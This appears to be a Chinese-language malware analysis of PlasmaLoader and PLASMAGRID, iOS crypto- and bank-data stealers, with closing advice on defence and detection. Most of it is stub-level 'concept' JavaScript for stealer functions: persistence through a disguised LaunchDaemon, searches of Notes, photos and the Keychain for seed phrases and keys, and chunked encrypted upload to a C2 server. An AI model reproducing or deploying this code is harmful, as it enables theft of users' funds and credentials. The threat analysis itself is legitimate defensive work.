# Coruna的PlasmaLoader载荷深度解析：金融信息窃取机制与加密货币威胁

## 摘要

Coruna漏洞利用工具集的最终阶段载荷PlasmaLoader和PLASMAGRID，专门针对加密货币用户和金融资产进行窃取。Google Threat Intelligence Group的报告显示，该载荷具备分析设备图像、识别二维码、搜索备忘录中的助记词和备份短语等能力。本文深入分析PlasmaLoader的技术实现、窃取机制和防御方法。

## 一、PlasmaLoader概述

### 1.1 载荷架构

```text
Coruna攻击链载荷阶段：

Kernel Exploit
    │
    ▼
PlasmaLoader (Stage 1)
    │
    ├─ 持久化驻留
    ├─ 环境检查
    └─ 下载第二阶段
    │
    ▼
PLASMAGRID (Stage 2)
    │
    ├─ 数据收集
    ├─ 加密通信
    └─ 命令执行
```

### 1.2 设计目标

PlasmaLoader的设计目标明确：

```text
主要目标：

1. 加密货币钱包
   - 助记词（12/24个单词）
   - 私钥文件
   - 备份短语
   
2. 金融应用
   - 银行应用凭据
   - 支付应用数据
   - 交易记录
   
3. 敏感信息
   - 备忘录中的密码
   - 照片中的二维码
   - 聊天记录中的金融信息
```

## 二、PlasmaLoader技术实现

### 2.1 持久化机制

PlasmaLoader首先需要实现持久化驻留。

```text
持久化策略：

1. 文件系统驻留
   - 隐藏在系统目录
   - 伪装为系统文件
   - 修改系统配置
   
2. 启动项修改
   - 添加启动LaunchDaemon
   - 修改现有服务配置
   - 利用系统启动流程
   
3. 数据持久化
   - 加密存储配置
   - 备份到多个位置
   - 防止单点失效
```

实现示例：

```javascript
// 概念代码

class PlasmaLoaderPersistence {
    constructor() {
        this.installPaths = [
            "/var/mobile/Library/Preferences/.system_cache",
            "/var/containers/Bundle/Application/.hidden",
            "/var/mobile/Media/.ios_metadata"
        ];
    }
    
    async install() {
        // 1. 选择安装路径
        let path = this.selectInstallPath();
        
        // 2. 创建目录
        await this.createHiddenDirectory(path);
        
        // 3. 写入载荷文件
        await this.writePayloadFiles(path);
        
        // 4. 设置权限
        await this.setPermissions(path);
        
        // 5. 注册启动项
        await this.registerLaunchDaemon(path);
        
        // 6. 清理安装痕迹
        await this.cleanupInstallationArtifacts();
    }
    
    async registerLaunchDaemon(path) {
        let plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemcache</string>
    <key>ProgramArguments</key>
    <array>
        <string>${path}/loader</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`;
        
        let plistPath = "/Library/LaunchDaemons/com.apple.systemcache.plist";
        await this.writeFile(plistPath, plist);
    }
}
```

### 2.2 环境检查

PlasmaLoader在执行前会检查环境。

```javascript
// 概念代码

class PlasmaLoaderEnvironment {
    async check() {
        let env = {
            // 设备信息
            device: await this.getDeviceInfo(),
            
            // 越狱状态
            jailbroken: await this.checkJailbreak(),
            
            // 安全软件
            securitySoftware: await this.detectSecuritySoftware(),
            
            // 调试器
            debugger: await this.detectDebugger(),
            
            // 目标应用
            targetApps: await this.findTargetApps()
        };
        
        // 如果环境不安全，可能选择退出
        if (!this.isEnvironmentSafe(env)) {
            return {safe: false, reason: "unsafe_environment"};
        }
        
        return {safe: true, env: env};
    }
    
    async findTargetApps() {
        let targets = [];
        
        // 加密货币钱包应用
        let cryptoApps = [
            "com.bitcoin.wallet",
            "com.coinbase.ios",
            "com.exodus.mobile",
            // ...
        ];
        
        for (let appId of cryptoApps) {
            if (await this.isAppInstalled(appId)) {
                targets.push({
                    type: "crypto_wallet",
                    appId: appId,
                    dataPath: await this.getAppDataPath(appId)
                });
            }
        }
        
        // 银行应用
        let bankingApps = [
            "com.chase.ios",
            "com.bankofamerica.ios",
            // ...
        ];
        
        for (let appId of bankingApps) {
            if (await this.isAppInstalled(appId)) {
                targets.push({
                    type: "banking",
                    appId: appId,
                    dataPath: await this.getAppDataPath(appId)
                });
            }
        }
        
        return targets;
    }
}
```

## 三、PLASMAGRID数据收集

### 3.1 加密货币钱包搜索

PLASMAGRID的核心功能是搜索加密货币钱包数据。

```javascript
// 概念代码

class CryptoWalletSearcher {
    constructor() {
        this.walletPatterns = [
            // 助记词模式
            {
                type: "mnemonic",
                pattern: /\b(abandon|ability|able|about|above|absent|absorb|abstract|absurd|abuse|access|accident|account|accuse|achieve|acid|acoustic|acquire|across|act|action|actor|actress|actual|adapt|add|addict|address|adjust|admit|adult|advance|advice|aerobic|affair|afford|afraid|again|age|agent|agree|ahead|aim|air|airport|aisle|alarm|album|alcohol|alert|alien|all|alley|allow|almost|alone|alpha|already|also|alter|always|amateur|amazing|among|amount|amused|analyst|anchor|ancient|anger|angle|angry|animal|ankle|announce|annual|another|answer|antenna|antique|anxiety|any|apart|apology|appear|apple|approve|april|arch|arctic|area|arena|argue|arm|armed|armor|army|around|arrange|arrest|arrive|arrow|art|artefact|artist|artwork|ask|aspect|assault|asset|assist|assume|asthma|athlete|atom|attack|attend|attitude|attract|auction|audit|august|aunt|author|auto|autumn|average|avocado|avoid|awake|aware|away|awesome|awful|awkward|axis)\b/g,
                context: ["mnemonic", "seed", "recovery", "backup", "助记词", "备份"]
            },
            
            // 私钥模式
            {
                type: "private_key",
                pattern: /[0-9a-fA-F]{64}/,
                context: ["private", "key", "私钥"]
            },
            
            // 钱包文件格式
            {
                type: "wallet_file",
                extensions: [".wallet", ".key", ".dat", ".json"],
                filenames: ["wallet", "key", "keystore", "backup"]
            }
        ];
    }
    
    async searchAll() {
        let results = [];
        
        // 1. 搜索文件系统
        results.push(await this.searchFileSystem());
        
        // 2. 搜索备忘录
        results.push(await this.searchNotes());
        
        // 3. 搜索照片（二维码）
        results.push(await this.searchPhotos());
        
        // 4. 搜索剪贴板
        results.push(await this.searchClipboard());
        
        // 5. 搜索应用数据
        results.push(await this.searchAppData());
        
        return results.filter(r => r !== null);
    }
    
    async searchNotes() {
        // 读取备忘录数据库
        let notesDb = "/var/mobile/Library/Notes/notesV7.sqlite";
        let notes = await this.readSQLite(notesDb);
        
        let results = [];
        
        for (let note of notes) {
            let content = note.title + " " + note.body;
            
            // 检查是否包含助记词
            let mnemonicMatch = this.checkMnemonic(content);
            if (mnemonicMatch) {
                results.push({
                    type: "mnemonic",
                    source: "notes",
                    noteId: note.id,
                    content: mnemonicMatch,
                    confidence: "high"
                });
            }
            
            // 检查是否包含私钥
            let keyMatch = this.checkPrivateKey(content);
            if (keyMatch) {
                results.push({
                    type: "private_key",
                    source: "notes",
                    noteId: note.id,
                    content: keyMatch,
                    confidence: "high"
                });
            }
        }
        
        return results;
    }
    
    async searchPhotos() {
        // 搜索照片中的二维码
        let photoDir = "/var/mobile/Media/DCIM/";
        let photos = await this.listFiles(photoDir);
        
        let results = [];
        
        for (let photo of photos) {
            // 检测二维码
            let qrCodes = await this.detectQRCodes(photo.path);
            
            for (let qr of qrCodes) {
                // 分析二维码内容
                let analysis = this.analyzeQRContent(qr.content);
                
                if (analysis.type === "crypto_wallet") {
                    results.push({
                        type: "qr_code",
                        source: "photo",
                        photoPath: photo.path,
                        qrContent: qr.content,
                        walletType: analysis.walletType,
                        confidence: "high"
                    });
                }
            }
        }
        
        return results;
    }
    
    checkMnemonic(text) {
        // BIP39助记词表有2048个单词
        // 检查文本中是否包含12或24个连续的助记词
        
        let words = text.toLowerCase().split(/\s+/);
        let mnemonicWords = [];
        
        for (let word of words) {
            if (this.isBIP39Word(word)) {
                mnemonicWords.push(word);
            } else {
                if (mnemonicWords.length >= 12) {
                    return mnemonicWords.join(" ");
                }
                mnemonicWords = [];
            }
        }
        
        if (mnemonicWords.length >= 12) {
            return mnemonicWords.join(" ");
        }
        
        return null;
    }
}
```

### 3.2 金融应用数据窃取

```javascript
// 概念代码

class FinancialDataStealer {
    async steal() {
        let data = {};
        
        // 1. 窃取Keychain数据
        data.keychain = await this.stealKeychain();
        
        // 2. 窃取应用沙箱数据
        data.appData = await this.stealAppData();
        
        // 3. 窃取浏览器数据
        data.browser = await this.stealBrowserData();
        
        // 4. 窃取键盘缓存
        data.keyboard = await this.stealKeyboardCache();
        
        return data;
    }
    
    async stealKeychain() {
        // 读取Keychain数据库
        let keychainDb = "/var/Keychains/keychain-2.db";
        
        // 需要解密，密钥在Secure Enclave中
        // 如果已经获得kernel权限，可能可以访问
        
        let items = await this.readSQLite(keychainDb);
        
        let financial = [];
        
        for (let item of items) {
            // 过滤金融相关项目
            if (this.isFinancialItem(item)) {
                financial.push({
                    service: item.service,
                    account: item.account,
                    data: item.data, // 可能已加密
                    created: item.created
                });
            }
        }
        
        return financial;
    }
    
    async stealKeyboardCache() {
        // iOS会缓存用户输入的内容
        let keyboardCache = "/var/mobile/Library/Keyboard/";
        
        let files = await this.listFiles(keyboardCache);
        let cacheData = [];
        
        for (let file of files) {
            let content = await this.readFile(file.path);
            
            // 搜索敏感信息
            let sensitive = this.extractSensitiveData(content);
            
            if (sensitive.length > 0) {
                cacheData.push({
                    file: file.path,
                    data: sensitive
                });
            }
        }
        
        return cacheData;
    }
}
```

## 四、数据外传机制

### 4.1 加密通信

```javascript
// 概念代码

class DataExfiltration {
    constructor(c2Config) {
        this.c2Url = c2Config.url;
        this.encryptionKey = c2Config.key;
    }
    
    async exfiltrate(data) {
        // 1. 压缩数据
        let compressed = await this.compress(data);
        
        // 2. 加密数据
        let encrypted = await this.encrypt(compressed);
        
        // 3. 分块
        let chunks = this.chunk(encrypted, 1024 * 1024); // 1MB
        
        // 4. 逐个上传
        for (let i = 0; i < chunks.length; i++) {
            await this.uploadChunk(chunks[i], i, chunks.length);
            
            // 随机延迟，避免被检测
            await this.sleep(Math.random() * 10000 + 5000);
        }
    }
    
    async encrypt(data) {
        // 使用AES-256-GCM加密
        let key = await this.importKey(this.encryptionKey);
        let iv = crypto.getRandomValues(new Uint8Array(12));
        
        let encrypted = await crypto.subtle.encrypt(
            {name: "AES-GCM", iv: iv},
            key,
            data
        );
        
        // 返回 iv + encrypted
        let result = new Uint8Array(iv.length + encrypted.byteLength);
        result.set(iv, 0);
        result.set(new Uint8Array(encrypted), iv.length);
        
        return result;
    }
    
    async uploadChunk(chunk, index, total) {
        let response = await fetch(this.c2Url + "/upload", {
            method: "POST",
            headers: {
                "Content-Type": "application/octet-stream",
                "X-Chunk-Index": index.toString(),
                "X-Chunk-Total": total.toString()
            },
            body: chunk
        });
        
        if (!response.ok) {
            throw new Error("Upload failed");
        }
    }
}
```

### 4.2 C2通信协议

```text
C2通信协议：

1. 心跳包
   - 每30分钟发送一次
   - 包含设备基本信息
   - 确认在线状态
   
2. 数据上传
   - 分块上传大数据
   - 支持断点续传
   - 加密传输
   
3. 命令接收
   - 轮询或长连接
   - 接收C2指令
   - 执行并返回结果
   
4. 紧急销毁
   - 接收销毁指令
   - 删除所有数据
   - 卸载载荷
```

## 五、防御与检测

### 5.1 用户防护

```text
用户防护措施：

1. 助记词保护
   - 不要存储在电子设备中
   - 使用硬件钱包
   - 纸质备份，安全存放
   
2. 应用安全
   - 只从App Store下载
   - 检查应用权限
   - 启用双重认证
   
3. 系统安全
   - 及时更新iOS
   - 启用锁定模式
   - 不访问可疑链接
   
4. 行为安全
   - 不在备忘录存储敏感信息
   - 不拍摄助记词照片
   - 谨慎分享屏幕
```

### 5.2 检测方法

```text
检测指标：

1. 文件系统异常
   - 隐藏的系统文件
   - 异常的LaunchDaemon
   - 未授权的数据访问
   
2. 网络异常
   - 异常的外联行为
   - 加密的C2通信
   - 大量数据上传
   
3. 行为异常
   - 大量文件读取
   - 数据库访问
   - 剪贴板监控
   
4. 性能异常
   - 电池消耗增加
   - 网络流量异常
   - 系统资源占用
```

## 六、结论

PlasmaLoader展示了针对加密货币用户的专业化攻击能力。其特点包括：

1. **精准定位** — 专门搜索加密货币钱包、助记词、私钥等
2. **多维度收集** — 文件系统、备忘录、照片、剪贴板全方位搜索
3. **隐蔽传输** — 加密分块上传，避免被检测

对于加密货币用户，最重要的防护措施是：

1. **永远不要在电子设备中存储助记词**
2. **使用硬件钱包存储大额资产**
3. **及时更新系统，启用锁定模式**
4. **警惕可疑链接和网页**

PlasmaLoader的出现表明，移动设备已经成为加密货币攻击的重要目标。用户需要提高安全意识，采取有效的防护措施。
